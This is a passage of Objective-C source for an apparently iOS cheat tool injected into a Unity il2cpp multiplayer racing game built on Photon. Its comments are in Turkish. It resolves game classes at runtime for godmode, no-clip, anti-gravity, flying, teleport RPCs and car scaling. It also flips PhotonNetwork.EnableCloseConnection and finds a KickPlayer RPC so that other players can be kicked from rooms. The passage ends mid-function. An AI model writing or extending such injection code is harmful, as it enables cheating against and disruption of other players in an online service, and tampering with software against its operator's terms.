static void (*hrph_TeleportPlayerRPC)(void* hrph, Vec3 pos, void* method) = NULL;
static void (*ssrcc_RpcTeleport)(void* ssrcc, Vec3 pos, Vec3 rot, Vec3 scale, float time, void* method) = NULL;
// ==== GODMODE (HR_PlayerHandler.canCrash=false -> hic kaza yapma) ====
static void* g_playerHandlerType = NULL;   // typeof(HR_PlayerHandler)
static void* g_myPlayerHandler = NULL;     // benim handler (PhotonView@0xB8.IsMine)
static void* g_myRccp = NULL;              // RCCP_CarController (handler@0x20) - ucus girdi (throttle@0x168 steer@0x170)
static bool  isGodmode = false;
// ==== UCUS SURUS (RCCP girdi + forward + acisal hiz) ====
static void* g_mTransGetFwd = NULL;        // Transform.get_forward -> Vector3
static void* g_mRbSetAngVel = NULL;        // Rigidbody.set_angularVelocity(Vector3)
static float flyDriveSpeed = 45.0f;        // ucusta ileri itme hizi
// ==== SELEKTOR (RCCP_Lights.highBeamHeadlights@0x41 hizli ac/kapat) ====
static void* g_rccpLightsType = NULL;      // typeof(RCCP_Lights)
static void* g_myLights = NULL;            // benim RCCP_Lights (g_rb'ye en yakin)
static bool  isSelektor = false;
static int   g_selTick = 0;
static int   g_selFlashRate = 1;   // yariperiyot frame sayisi (1=en hizli strobe, buyudukce yavas)
// ==== YENI HAVALI HACKLER ====
static void* g_mRbSetDetect = NULL;    // Rigidbody.set_detectCollisions (no-clip)
static void* g_mRbUseGrav = NULL;      // Rigidbody.set_useGravity (anti-grav)
// ==== ARAC RENGI (Renderer.material.color) ====
typedef struct { float r, g, b, a; } Color4;
static void* g_rendererType = NULL;    // typeof(UnityEngine.Renderer)
static void* g_mGetCompsChild = NULL;  // Component.GetComponentsInChildren(Type,bool)
static void* g_mRendGetMat = NULL;     // Renderer.get_material
static void* g_mMatSetColor = NULL;    // Material.set_color(Color)
static bool  isCarColorEnabled = false;
static bool  carColorRainbow = true;   // true=RGB dongu, false=sabit renk
static float g_carHue = 0.0f;
static Color4 g_carColor = {1.0f, 0.0f, 0.0f, 1.0f};   // sabit renk (kirmizi)
static void* g_carMats[96]; static int g_carMatCount = 0;  // materyal onbellegi
static bool  isNoClip = false;         // hayalet mod (duvardan gec)
static bool  isAntiGrav = false;       // yercekimi kapali (ay modu)
// ==== ARAC BOYUTU (g_rb transformunu olcekle) ====
static void* g_mTransSetScale = NULL;  // Transform.set_localScale(Vector3)
static bool  isCarSizeEnabled = false;
static float carSizeVal = 1.0f;        // 0.3 - 5.0
static bool  isSpeedHud = false;       // hiz gostergesi HUD
static bool  g_noClipApplied = false;  // durum takibi (surekli set etmemek icin)
static bool  g_antiGravApplied = false;
static float g_hudSpeed = 0, g_hudRPM = 0; static int g_hudGear = 0;
// ==== ARAC DEGISTIRME (hooksuz, il2cpp singleton uzerinden) ====
// HR_MainMenuHandler: static field 'iiz' = singleton
// metodlar: SelectCar / PositiveCarIndex / NegativeCarIndex / BuyCar
static void* (*i_class_get_field_from_name)(void*, const char*) = NULL;
static void  (*i_field_static_get_value)(void*, void*) = NULL;
static void  (*i_field_static_set_value)(void*, void*) = NULL;   // static alan YAZ (EnableCloseConnection icin)
static size_t (*i_field_get_offset)(void*) = NULL;
static void* g_fEnableCloseConn = NULL;                          // PhotonNetwork.EnableCloseConnection static field (kick acar) - init'te kullanildigi icin erken tanimli
static void* g_lobbyDummyType = NULL;   // HR_PhotonLobbyManagerDummy tipi (init'te bulunur -> erken tanimli)
static void* g_mDummyKick = NULL;       // HR_PhotonLobbyManagerDummy.KickPlayer() -> photonView.RPC("KickPlayerRPC", All, +0x108 ipg)
static void* (*mbp_getPhotonView)(void*) = NULL;  // MonoBehaviourPun.get_photonView 0x594DB48 (dogru lobi instance'i secmek icin)
static void* g_mmhClass   = NULL;   // HR_MainMenuHandler Il2CppClass*
static void* g_mmhField   = NULL;   // 'iiz' static field
static void* g_mSelectCar = NULL;
static void* g_mNextCar   = NULL;
static void* g_mPrevCar   = NULL;
// ==== HOOKSUZ ARABA BULMA ====
// MSHookFunction bu oyunda calismiyor (0 OK / 17 FAIL) -> hook yerine
// UnityEngine.Object.FindObjectOfType(Type) ile arabayi her saniye ARIYORUZ.
static void* (*i_class_get_type)(void*) = NULL;
static void* (*i_type_get_object)(void*) = NULL;
// Sinif adiyla tarama (namespace tahmini gerektirmez - en saglam yol)
static size_t (*i_image_get_class_count)(const void*) = NULL;
static const void* (*i_image_get_class)(const void*, size_t) = NULL;
static const char* (*i_class_get_name)(void*) = NULL;
// Bir image'da verilen isimdeki sinifi TARAYARAK bul (obfuscation'a dayanikli)
static long g_classScanned = 0;   // teshis: kac sinif tarandi
static void* few1n_findClassByName(const void* img, const char* wantName) {
    if (!i_image_get_class_count || !i_image_get_class || !i_class_get_name) return NULL;
    size_t cnt = 0;
    @try { cnt = i_image_get_class_count(img); } @catch (...) { return NULL; }
    if (cnt == 0 || cnt > 200000) return NULL;
    for (size_t k = 0; k < cnt; k++) {
        // HER sinifi ayri koru: bir bozuk sinif tum taramayi iptal etmesin
        @try {
            void* cls = (void*)i_image_get_class(img, k);
            if (!cls) continue;
            const char* nm = i_class_get_name(cls);
            g_classScanned++;
            if (nm && strcmp(nm, wantName) == 0) return cls;
        } @catch (...) { continue; }
    }
    return NULL;
}
// Sinif -> System.Type nesnesi (FindObjectOfType icin)
static void* few1n_typeObjOf(void* cls) {
    if (!cls || !i_class_get_type || !i_type_get_object) return NULL;
    @try {
        void* t = i_class_get_type(cls);
        if (t) return i_type_get_object(t);
    } @catch (...) {}
    return NULL;
}
// v114.6: GECERLI image ile class ara. i_class_from_name(NULL,...) il2cpp icinde NULL image
// dereference eder -> SIGSEGV. Obj-C @try/@catch bir donanim sinyalini (SIGSEGV) YAKALAYAMAZ,
// bu yuzden oyun aninda coker (balata/motor/emissive/trafik/scan/write hepsi bu yuzden atiyordu).
// Cozum: tum assembly image'lerini gezip GECERLI img ile ara; bulunamazsa isimle tam tarama.
static void* few1n_classAnyImage(const char* ns, const char* name) {
    if (!name || !i_class_from_name || !i_domain_get || !i_domain_get_assemblies || !i_assembly_get_image) return NULL;
    @try {
        void* domain = i_domain_get();
        if (!domain) return NULL;
        unsigned long n = 0;
        void** asms = i_domain_get_assemblies(domain, &n);
        if (!asms || n == 0 || n > 8192) return NULL;
        for (unsigned long i = 0; i < n; i++) {
            const void* img = i_assembly_get_image(asms[i]);
            if (!img) continue;
            void* c = NULL;
            @try { c = i_class_from_name(img, ns ? ns : "", name); } @catch (...) { c = NULL; }
            if (c) return c;
        }
        // namespace tahmini tutmadi -> sinif adiyla tam tarama (obfuscation-safe)
        for (unsigned long i = 0; i < n; i++) {
            const void* img = i_assembly_get_image(asms[i]);
            if (!img) continue;
            void* c = few1n_findClassByName(img, name);
            if (c) return c;
        }
    } @catch (...) {}
    return NULL;
}
static void* g_mFindObjectOfType = NULL;   // UnityEngine.Object.FindObjectOfType(Type)
static void* g_mFindObjInactive  = NULL;   // FindObjectOfType(Type, bool includeInactive)
static void* g_mFindAnyByType    = NULL;   // FindAnyObjectByType(Type)
static void* g_carDriveTypeObj   = NULL;   // typeof(CarDriveSystem)
static void* g_carInputTypeObj   = NULL;   // typeof(CarPlayerInput)

static void few1n_initIl2cpp(void) {
    i_domain_get                = (void*(*)(void))dlsym(RTLD_DEFAULT, "il2cpp_domain_get");
    i_domain_get_assemblies     = (void**(*)(void*,unsigned long*))dlsym(RTLD_DEFAULT, "il2cpp_domain_get_assemblies");
    i_assembly_get_image        = (const void*(*)(void*))dlsym(RTLD_DEFAULT, "il2cpp_assembly_get_image");
    i_class_from_name           = (void*(*)(const void*,const char*,const char*))dlsym(RTLD_DEFAULT, "il2cpp_class_from_name");
    i_class_get_method_from_name= (void*(*)(void*,const char*,int))dlsym(RTLD_DEFAULT, "il2cpp_class_get_method_from_name");
    i_runtime_invoke            = (void*(*)(void*,void*,void**,void**))dlsym(RTLD_DEFAULT, "il2cpp_runtime_invoke");
    i_thread_attach             = (void*(*)(void*))dlsym(RTLD_DEFAULT, "il2cpp_thread_attach");
    i_object_new                = (void*(*)(void*))dlsym(RTLD_DEFAULT, "il2cpp_object_new");
    i_array_new                 = (void*(*)(void*,unsigned long))dlsym(RTLD_DEFAULT, "il2cpp_array_new");
    // v114.19: safeHookByName icin gerekli
    i_method_get_pointer        = (void*(*)(void*))dlsym(RTLD_DEFAULT, "il2cpp_method_get_pointer");
    i_class_get_field_from_name = (void*(*)(void*,const char*))dlsym(RTLD_DEFAULT, "il2cpp_class_get_field_from_name");
    i_field_static_get_value    = (void(*)(void*,void*))dlsym(RTLD_DEFAULT, "il2cpp_field_static_get_value");
    i_field_static_set_value    = (void(*)(void*,void*))dlsym(RTLD_DEFAULT, "il2cpp_field_static_set_value");
    i_field_get_offset          = (size_t(*)(void*))dlsym(RTLD_DEFAULT, "il2cpp_field_get_offset");
    i_class_get_type            = (void*(*)(void*))dlsym(RTLD_DEFAULT, "il2cpp_class_get_type");
    i_type_get_object           = (void*(*)(void*))dlsym(RTLD_DEFAULT, "il2cpp_type_get_object");
    i_image_get_class_count     = (size_t(*)(const void*))dlsym(RTLD_DEFAULT, "il2cpp_image_get_class_count");
    i_image_get_class           = (const void*(*)(const void*,size_t))dlsym(RTLD_DEFAULT, "il2cpp_image_get_class");
    i_class_get_name            = (const char*(*)(void*))dlsym(RTLD_DEFAULT, "il2cpp_class_get_name");
    if (!i_domain_get || !i_domain_get_assemblies || !i_assembly_get_image ||
        !i_class_from_name || !i_class_get_method_from_name || !i_runtime_invoke) {
        FLog(@"il2cpp API bulunamadi!"); return;
    }
    void* domain = i_domain_get();
    if (i_thread_attach && domain) i_thread_attach(domain);   // bu thread'i il2cpp'e bagla
    unsigned long n = 0;
    void** asms = i_domain_get_assemblies(domain, &n);
    FLog([NSString stringWithFormat:@"il2cpp: %lu assembly taraniyor", n]);
    for (unsigned long i = 0; i < n; i++) {
        const void* img = i_assembly_get_image(asms[i]);
        if (!img) continue;
        if (!g_mSetTS) {
            void* timeClass = i_class_from_name(img, "UnityEngine", "Time");
            if (timeClass) {
                g_mSetTS = i_class_get_method_from_name(timeClass, "set_timeScale", 1);
                g_mGetTS = i_class_get_method_from_name(timeClass, "get_timeScale", 0);
                FLog([NSString stringWithFormat:@"Time bulundu! set=%p get=%p", g_mSetTS, g_mGetTS]);
            }
        }
        // UnityEngine.Object.FindObjectOfType(Type) - hooksuz arama icin
        if (!g_mFindObjectOfType) {
            void* oc = i_class_from_name(img, "UnityEngine", "Object");
            if (oc) {
                g_mFindObjectOfType = i_class_get_method_from_name(oc, "FindObjectOfType", 1);
                g_mFindObjInactive  = i_class_get_method_from_name(oc, "FindObjectOfType", 2);
                g_mFindAnyByType    = i_class_get_method_from_name(oc, "FindAnyObjectByType", 1);
                g_mFindObjectsPlural= i_class_get_method_from_name(oc, "FindObjectsOfType", 1); // cogul -> array
                FLog([NSString stringWithFormat:@"Bulucular: tek=%p cogul=%p any=%p",
                      g_mFindObjectOfType, g_mFindObjectsPlural, g_mFindAnyByType]);
            }
        }
        // ESP - Camera metodlari
        if (!g_mCamGetMain) {
            void* cc = i_class_from_name(img, "UnityEngine", "Camera");
            if (cc) {
                g_mCamGetMain    = i_class_get_method_from_name(cc, "get_main", 0);
                g_mWorldToScreen = i_class_get_method_from_name(cc, "WorldToScreenPoint", 1);
                FLog([NSString stringWithFormat:@"Camera: main=%p w2s=%p", g_mCamGetMain, g_mWorldToScreen]);
            }
        }
        // typeof(CarDriveSystem) - once namespace ile, olmazsa SINIF TARAYARAK (obfuscation'a dayanikli)
        if (!g_carDriveTypeObj) {
            void* c = i_class_from_name(img, "TurnTheGameOn.IKAvatarDriver", "CarDriveSystem");
            if (!c) c = i_class_from_name(img, "TurnTheGameOn", "CarDriveSystem");
            if (!c) c = i_class_from_name(img, "", "CarDriveSystem");
            if (!c) c = few1n_findClassByName(img, "CarDriveSystem");   // tam tarama
            if (c) {
                g_carDriveTypeObj = few1n_typeObjOf(c);
                FLog([NSString stringWithFormat:@"CarDriveSystem: sinif=%p tipNesnesi=%p", c, g_carDriveTypeObj]);
            }
        }
        if (!g_carInputTypeObj) {
            void* c = i_class_from_name(img, "TurnTheGameOn.IKAvatarDriver", "CarPlayerInput");
            if (!c) c = i_class_from_name(img, "", "CarPlayerInput");
            if (!c) c = few1n_findClassByName(img, "CarPlayerInput");
            if (c) g_carInputTypeObj = few1n_typeObjOf(c);
        }
        if (!g_mmhClass) {
            void* c = i_class_from_name(img, "", "HR_MainMenuHandler");
            if (c) {
                g_mmhClass   = c;
                g_mSelectCar = i_class_get_method_from_name(c, "SelectCar", 0);
                g_mNextCar   = i_class_get_method_from_name(c, "PositiveCarIndex", 0);
                g_mPrevCar   = i_class_get_method_from_name(c, "NegativeCarIndex", 0);
                g_mmhClass = c;   // Y6 icin gerekli
                if (i_class_get_field_from_name) g_mmhField = i_class_get_field_from_name(c, "iiz");
                FLog([NSString stringWithFormat:@"MainMenuHandler bulundu! sec=%p ileri=%p geri=%p singleton=%p",
                      g_mSelectCar, g_mNextCar, g_mPrevCar, g_mmhField]);
            }
        }
        if (!g_mRbSetVel) {
            void* rbClass = i_class_from_name(img, "UnityEngine", "Rigidbody");
            if (rbClass) {
                // Unity6: linearVelocity (yeni). Eski velocity de denenir.
                g_mRbGetVel = i_class_get_method_from_name(rbClass, "get_linearVelocity", 0);
                g_mRbSetVel = i_class_get_method_from_name(rbClass, "set_linearVelocity", 1);
                if (!g_mRbSetVel) {
                    g_mRbGetVel = i_class_get_method_from_name(rbClass, "get_velocity", 0);
                    g_mRbSetVel = i_class_get_method_from_name(rbClass, "set_velocity", 1);
                }
                g_mRbGetPos = i_class_get_method_from_name(rbClass, "get_position", 0);
                g_mRbSetPos = i_class_get_method_from_name(rbClass, "set_position", 1);
                g_mRbSetAngVel = i_class_get_method_from_name(rbClass, "set_angularVelocity", 1);  // ucus donme
                g_mRbSetDetect = i_class_get_method_from_name(rbClass, "set_detectCollisions", 1);  // no-clip
                g_mRbUseGrav   = i_class_get_method_from_name(rbClass, "set_useGravity", 1);        // anti-grav
                g_rbTypeObj = few1n_typeObjOf(rbClass);   // FindObjectsOfType(Rigidbody) yedek yolu icin
                FLog([NSString stringWithFormat:@"Rigidbody bulundu! get=%p set=%p tip=%p", g_mRbGetVel, g_mRbSetVel, g_rbTypeObj]);
            }
        }
        if (!g_mCompGetTransform) {
            void* cmp = i_class_from_name(img, "UnityEngine", "Component");
            if (cmp) {
                g_mCompGetTransform = i_class_get_method_from_name(cmp, "get_transform", 0);
                g_mGetCompsChild    = i_class_get_method_from_name(cmp, "GetComponentsInChildren", 2); // (Type,bool)
                g_mGetCompInParent  = i_class_get_method_from_name(cmp, "GetComponentInParent", 2);     // (Type,bool)
            }
        }
        if (!g_rendererType) {
            void* rc = i_class_from_name(img, "UnityEngine", "Renderer");
            if (rc) { g_rendererType = few1n_typeObjOf(rc); g_mRendGetMat = i_class_get_method_from_name(rc, "get_material", 0); }
        }
        if (!g_mMatSetColor) {
            void* mc = i_class_from_name(img, "UnityEngine", "Material");
            if (mc) g_mMatSetColor = i_class_get_method_from_name(mc, "set_color", 1);
        }
        if (!g_mTransGetPos) {
            void* tr = i_class_from_name(img, "UnityEngine", "Transform");
            if (tr) { g_mTransGetPos = i_class_get_method_from_name(tr, "get_position", 0);
                      g_mTransSetScale = i_class_get_method_from_name(tr, "set_localScale", 1);
                      g_mTransGetFwd = i_class_get_method_from_name(tr, "get_forward", 0); }
        }
        if (!g_mSetRichText) {
            void* tmpClass = i_class_from_name(img, "TMPro", "TMP_Text");
            if (tmpClass) {
                g_mSetRichText = i_class_get_method_from_name(tmpClass, "set_richText", 1);
                g_mTmpSetText  = i_class_get_method_from_name(tmpClass, "set_text", 1);
                FLog([NSString stringWithFormat:@"TMP_Text bulundu! set_richText=%p set_text=%p", g_mSetRichText, g_mTmpSetText]);
            }
        }
        if (!g_plateTypeObj) {
            void* pc = i_class_from_name(img, "", "PlateVariant");
            if (!pc) pc = few1n_findClassByName(img, "PlateVariant");
            if (pc) { g_plateTypeObj = few1n_typeObjOf(pc); FLog([NSString stringWithFormat:@"PlateVariant tipi=%p", g_plateTypeObj]); }
        }
        if (!g_roomLineType) {
            void* rc = i_class_from_name(img, "", "HR_UI_RoomListLine");
            if (!rc) rc = few1n_findClassByName(img, "HR_UI_RoomListLine");
            if (rc) { g_roomLineType = few1n_typeObjOf(rc); FLog([NSString stringWithFormat:@"RoomListLine tipi=%p", g_roomLineType]); }
        }
        if (!g_photonViewType) {
            void* pv = i_class_from_name(img, "Photon.Pun", "PhotonView");
            if (!pv) pv = few1n_findClassByName(img, "PhotonView");
            if (pv) { g_photonViewType = few1n_typeObjOf(pv);
                      // Field-read: metod cagirmadan alanlari dogrudan hafizadan oku (cokme YOK)
                      if (i_class_get_field_from_name) {
                          g_fIsMine = i_class_get_field_from_name(pv, "<IsMine>k__BackingField");
                          g_fOwner  = i_class_get_field_from_name(pv, "<Owner>k__BackingField");
                      }
                      if (g_fIsMine && i_field_get_offset) g_isMineOff  = (int)i_field_get_offset(g_fIsMine);
                      if (g_fOwner  && i_field_get_offset) g_pvOwnerOff = (int)i_field_get_offset(g_fOwner);
                      FLog([NSString stringWithFormat:@"PhotonView tipi=%p IsMineOff=%d OwnerOff=%d", g_photonViewType, g_isMineOff, g_pvOwnerOff]); }
        }
        // ===== KICK ACICI: PhotonNetwork.EnableCloseConnection = true =====
        // PUN2'de bu FALSE ise CloseConnection master olsan bile FALSE doner (kendi odanda bile atamazsin).
        if (!g_fEnableCloseConn) {
            void* pnc = i_class_from_name(img, "Photon.Pun", "PhotonNetwork");
            if (!pnc) pnc = few1n_findClassByName(img, "PhotonNetwork");
            if (pnc && i_class_get_field_from_name) {
                g_fEnableCloseConn = i_class_get_field_from_name(pnc, "EnableCloseConnection");
                if (g_fEnableCloseConn && i_field_static_set_value) {
                    bool t = true; i_field_static_set_value(g_fEnableCloseConn, &t);
                    FLog(@"PhotonNetwork.EnableCloseConnection=TRUE -> kick artik calisir (kendi odanda)");
                }
            }
        }
        if (!g_lobbyDummyType) {
            void* ldc = i_class_from_name(img, "", "HR_PhotonLobbyManagerDummy");
            if (!ldc) ldc = few1n_findClassByName(img, "HR_PhotonLobbyManagerDummy");
            if (ldc) { g_lobbyDummyType = few1n_typeObjOf(ldc);
                       if (i_class_get_method_from_name) g_mDummyKick = i_class_get_method_from_name(ldc, "KickPlayer", 0);
                       FLog([NSString stringWithFormat:@"LobbyDummy tipi=%p kick=%p (GERCEK kick RPC)", g_lobbyDummyType, g_mDummyKick]); }
        }
        if (!g_playerHandlerType) {
            void* ph = i_class_from_name(img, "", "HR_PlayerHandler");
            if (!ph) ph = few1n_findClassByName(img, "HR_PlayerHandler");
            if (ph) { g_playerHandlerType = few1n_typeObjOf(ph); FLog([NSString stringWithFormat:@"HR_PlayerHandler tipi=%p (godmode)", g_playerHandlerType]); }
        }
        if (!g_rccpLightsType) {
            void* rl = i_class_from_name(img, "", "RCCP_Lights");
            if (!rl) rl = few1n_findClassByName(img, "RCCP_Lights");
            if (rl) { g_rccpLightsType = few1n_typeObjOf(rl); FLog([NSString stringWithFormat:@"RCCP_Lights tipi=%p (selektor)", g_rccpLightsType]); }
        }
        // v100: RCCP + HR gizli ozellik class'lari + field offset'ler (il2cpp API)
        if (!g_rccpNosTypeObj) {
            void* c = i_class_from_name(img, "", "RCCP_Nos");
            if (!c) c = few1n_findClassByName(img, "RCCP_Nos");
            if (c) {
                g_rccpNosTypeObj = few1n_typeObjOf(c);
                if (i_class_get_field_from_name && i_field_get_offset) {
                    void* f = i_class_get_field_from_name(c, "amount");
                    if (f) g_offNosAmount = (int)i_field_get_offset(f);
                    f = i_class_get_field_from_name(c, "regenerateRate");
                    if (f) g_offNosRegen = (int)i_field_get_offset(f);
                    f = i_class_get_field_from_name(c, "torqueMultiplier");
                    if (f) g_offNosTorqMult = (int)i_field_get_offset(f);
                }
                FLog([NSString stringWithFormat:@"🎁 RCCP_Nos: amount@%d regen@%d torqM@%d", g_offNosAmount, g_offNosRegen, g_offNosTorqMult]);
            }
        }
        if (!g_rccpFuelTypeObj) {
            void* c = i_class_from_name(img, "", "RCCP_FuelTank");
            if (!c) c = few1n_findClassByName(img, "RCCP_FuelTank");
            if (c) {
                g_rccpFuelTypeObj = few1n_typeObjOf(c);
                if (i_class_get_field_from_name && i_field_get_offset) {
                    void* f = i_class_get_field_from_name(c, "fuelTankFillAmount");
                    if (f) g_offFuelFill = (int)i_field_get_offset(f);
                    f = i_class_get_field_from_name(c, "fuelTankCapacity");
                    if (f) g_offFuelCap = (int)i_field_get_offset(f);
                    f = i_class_get_field_from_name(c, "fuelConsumption");
                    if (f) g_offFuelConsump = (int)i_field_get_offset(f);
                }
                FLog([NSString stringWithFormat:@"🎁 RCCP_FuelTank: fill@%d cap@%d cons@%d", g_offFuelFill, g_offFuelCap, g_offFuelConsump]);
            }
        }
        if (!g_rccpDamageTypeObj) {
            void* c = i_class_from_name(img, "", "RCCP_Damage");
            if (!c) c = few1n_findClassByName(img, "RCCP_Damage");
            if (c) {
                g_rccpDamageTypeObj = few1n_typeObjOf(c);
                if (i_class_get_field_from_name && i_field_get_offset) {
                    void* f = i_class_get_field_from_name(c, "maximumDamage");
                    if (f) g_offDamageMax = (int)i_field_get_offset(f);
                    f = i_class_get_field_from_name(c, "deformationMultiplier");
                    if (f) g_offDamageMult = (int)i_field_get_offset(f);
                }
                FLog([NSString stringWithFormat:@"🎁 RCCP_Damage: max@%d mult@%d", g_offDamageMax, g_offDamageMult]);
            }
        }
        if (!g_rccpEngineTypeObj) {
            void* c = i_class_from_name(img, "", "RCCP_Engine");
            if (!c) c = few1n_findClassByName(img, "RCCP_Engine");
            if (c) {
                g_rccpEngineTypeObj = few1n_typeObjOf(c);
                if (i_class_get_field_from_name && i_field_get_offset) {
                    void* f = i_class_get_field_from_name(c, "engineRPM");
                    if (f) g_offEngineRpm = (int)i_field_get_offset(f);
                    f = i_class_get_field_from_name(c, "maxEngineRPM");
                    if (f) g_offEngineMaxRpm = (int)i_field_get_offset(f);
                    f = i_class_get_field_from_name(c, "overrideEngineRPM");
                    if (f) g_offEngineOverride = (int)i_field_get_offset(f);
                }
                FLog([NSString stringWithFormat:@"🎁 RCCP_Engine: rpm@%d maxRpm@%d override@%d", g_offEngineRpm, g_offEngineMaxRpm, g_offEngineOverride]);
            }
        }
        if (!g_hrTrafficTypeObj) {
            void* c = i_class_from_name(img, "", "HR_TrafficSettings");
            if (!c) c = few1n_findClassByName(img, "HR_TrafficSettings");
            if (c) {
                g_hrTrafficTypeObj = few1n_typeObjOf(c);
                FLog([NSString stringWithFormat:@"🎁 HR_TrafficSettings tipi=%p", g_hrTrafficTypeObj]);
            }
        }
        if (!g_rccpExhaustTypeObj) {
            void* c = i_class_from_name(img, "", "RCCP_Exhaust");
            if (!c) c = few1n_findClassByName(img, "RCCP_Exhaust");
            if (c) g_rccpExhaustTypeObj = few1n_typeObjOf(c);
        }
        if (!g_rccpSpoilerTypeObj) {
            void* c = i_class_from_name(img, "", "RCCP_ActiveSpoiler");
            if (!c) c = few1n_findClassByName(img, "RCCP_ActiveSpoiler");
            if (c) g_rccpSpoilerTypeObj = few1n_typeObjOf(c);
        }
        if (!g_hrBombTypeObj) {
            void* c = i_class_from_name(img, "", "HR_Bomb");
            if (!c) c = few1n_findClassByName(img, "HR_Bomb");
            if (c) g_hrBombTypeObj = few1n_typeObjOf(c);
        }
        if (!g_hrTrafficCarTypeObj) {
            void* c = i_class_from_name(img, "", "HR_TrafficCar");
            if (!c) c = few1n_findClassByName(img, "HR_TrafficCar");
            if (c) g_hrTrafficCarTypeObj = few1n_typeObjOf(c);
        }
        if (!g_hrPhotonSyncTypeObj) {
            void* c = i_class_from_name(img, "", "HR_PhotonSync");
            if (!c) c = few1n_findClassByName(img, "HR_PhotonSync");
            if (c) {
                g_hrPhotonSyncTypeObj = few1n_typeObjOf(c);
                if (i_class_get_field_from_name && i_field_get_offset) {
                    void* f = i_class_get_field_from_name(c, "isMine");
                    if (f) g_offPhotonIsMine = (int)i_field_get_offset(f);
                }
            }
        }
        // v102: DetachablePart + Exhaust field offsetleri
        if (!g_rccpDetachTypeObj) {
            void* c = i_class_from_name(img, "", "RCCP_DetachablePart");
            if (!c) c = few1n_findClassByName(img, "RCCP_DetachablePart");
            if (c) {
                g_rccpDetachTypeObj = few1n_typeObjOf(c);
                if (i_class_get_field_from_name && i_field_get_offset) {
                    void* f = i_class_get_field_from_name(c, "strength");
                    if (f) g_offDetachStrength = (int)i_field_get_offset(f);
                    f = i_class_get_field_from_name(c, "isDetachable");
                    if (f) g_offDetachIsDetachable = (int)i_field_get_offset(f);
                }
            }
        }
        // v114.4: HR_PhotonLobbyManagerDummy resolve + roomListPanel offset
        if (!g_hrLobbyMgrDummyType) {
            void* c = i_class_from_name(img, "", "HR_PhotonLobbyManagerDummy");
            if (!c) c = few1n_findClassByName(img, "HR_PhotonLobbyManagerDummy");
            if (c) {
                g_hrLobbyMgrDummyType = few1n_typeObjOf(c);
                if (i_class_get_field_from_name && i_field_get_offset) {
                    void* f = i_class_get_field_from_name(c, "roomListPanel");
                    if (f) g_offRoomListPanel = (int)i_field_get_offset(f);
                }
                FLog([NSString stringWithFormat:@"🌐 HR_PhotonLobbyManagerDummy: type=%p roomListPanel@%d", g_hrLobbyMgrDummyType, g_offRoomListPanel]);
            }
        }
        // UnityEngine.GameObject.SetActive(bool) resolve - chain sonu panel switch icin
        if (!g_mGoSetActive) {
            void* gc = i_class_from_name(img, "UnityEngine", "GameObject");
            if (gc && i_class_get_method_from_name) g_mGoSetActive = i_class_get_method_from_name(gc, "SetActive", 1);
        }
        if (g_rccpExhaustTypeObj && !g_offExhaustFlameCutoff) {
            void* c = i_class_from_name(img, "", "RCCP_Exhaust");
            if (!c) c = few1n_findClassByName(img, "RCCP_Exhaust");
            if (c && i_class_get_field_from_name && i_field_get_offset) {
                void* f = i_class_get_field_from_name(c, "flameOnCutOff");
                if (f) g_offExhaustFlameCutoff = (int)i_field_get_offset(f);
            }
        }
        if (!g_carPhotonSyncTypeObj) {
            void* cps = i_class_from_name(img, "", "CarPhotonSync");
            if (!cps) cps = few1n_findClassByName(img, "CarPhotonSync");
            if (cps) { g_carPhotonSyncTypeObj = few1n_typeObjOf(cps); FLog([NSString stringWithFormat:@"CarPhotonSync tipi=%p", g_carPhotonSyncTypeObj]); }
        }
        if (!g_hrPhotonHandlerTypeObj) {
            void* hrph = i_class_from_name(img, "", "HR_PhotonHandler");
            if (!hrph) hrph = few1n_findClassByName(img, "HR_PhotonHandler");
            if (hrph) { g_hrPhotonHandlerTypeObj = few1n_typeObjOf(hrph); FLog([NSString stringWithFormat:@"HR_PhotonHandler tipi=%p", g_hrPhotonHandlerTypeObj]); }
        }
        if (!g_roomOptionsClass) {
            void* roc = i_class_from_name(img, "Photon.Realtime", "RoomOptions");
            if (roc) { g_roomOptionsClass = roc; FLog([NSString stringWithFormat:@"RoomOptions bulundu! %p", roc]); }
            // v114.4: Room class + set_Name method
            if (!g_roomClass) {
                void* rc = i_class_from_name(img, "Photon.Realtime", "Room");
                if (!rc) rc = few1n_findClassByName(img, "Room");
                if (rc) {
                    g_roomClass = rc;
                    if (i_class_get_method_from_name) g_mRoomSetName = i_class_get_method_from_name(rc, "set_Name", 1);
                    FLog([NSString stringWithFormat:@"Photon.Room bulundu: class=%p set_Name=%p", rc, g_mRoomSetName]);
                }
            }
        }
        // v85: RCCP_WheelGlow — balata sicak tutmak icin
        // v97: FALLBACK ZINCIRI - farkli RCCP class isimlerini dene
        if (!g_wheelGlowTypeObj) {
            const char* candidates[] = {
                "RCCP_WheelGlow",
                "WheelGlow",
                "RCCP_WheelSlipParticles",
                "RCCP_WheelSlip",
                "RCCP_BrakeCaliper",
                "RCCP_Wheel",
                "RCCP_WheelCollider",
                NULL
            };
            for (int i = 0; candidates[i]; i++) {
                void* wg = i_class_from_name(img, "", candidates[i]);
                if (!wg) wg = few1n_findClassByName(img, candidates[i]);
                if (wg) {
                    g_wheelGlowTypeObj = few1n_typeObjOf(wg);
                    FLog([NSString stringWithFormat:@"🔥 Balata: %s tipi=%p BULUNDU", candidates[i], g_wheelGlowTypeObj]);
                    break;
                }
            }
            if (!g_wheelGlowTypeObj) FLog(@"🔥 Balata: HICBIR WheelGlow class'i bulunamadi bu build'de");
        }
        // Photon.Hashtable — sifre + custom property icin
        if (!g_hashtableClass) {
            void* ht = i_class_from_name(img, "ExitGames.Client.Photon", "Hashtable");
            if (ht) {
                g_hashtableClass = ht;
                g_mHashtableCtor = i_class_get_method_from_name(ht, ".ctor", 0);
                g_mHashtableSetItem = i_class_get_method_from_name(ht, "set_Item", 2);
                FLog([NSString stringWithFormat:@"Photon.Hashtable bulundu: cls=%p ctor=%p setItem=%p", ht, g_mHashtableCtor, g_mHashtableSetItem]);
            }
        }
        // ONEMLI: araba tipleri de bulunana kadar DURMA (ayri assembly'de olabilir)
        if (g_mSetTS && g_mRbSetVel && g_mSetRichText && g_roomOptionsClass &&
            g_carDriveTypeObj && g_carInputTypeObj && g_mCamGetMain) break;
    }
    g_il2cppReady = (g_mSetTS != NULL);
    FLog([NSString stringWithFormat:@"il2cpp bitti: carTip=%@ inputTip=%@ (taranan sinif=%ld)",
          g_carDriveTypeObj ? @"VAR" : @"YOK", g_carInputTypeObj ? @"VAR" : @"YOK", g_classScanned]);
    if (!g_il2cppReady) FLog(@"UnityEngine.Time bulunamadi");
}

// v85: Photon Hashtable helper — string-string dict'i il2cpp Photon.Hashtable'a cevirir
static void* mkPhotonHashtable(NSDictionary<NSString*, NSString*> *dict) {
